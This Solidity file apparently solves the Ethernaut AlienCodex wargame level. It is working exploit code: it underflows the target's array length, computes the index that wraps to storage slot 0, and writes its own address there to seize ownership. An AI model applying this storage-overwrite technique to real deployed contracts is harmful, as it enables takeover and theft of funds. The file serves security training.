// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract AlienHack {
    AlienCodex AlienCodexContract ;

    constructor(address _AlienCodexContract) public{
        AlienCodexContract = AlienCodex(_AlienCodexContract);
    }

    function clark() external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        AlienCodexContract.make_contact();
        AlienCodexContract.retract();
        AlienCodexContract.revise(index, myAddress);
    }
}
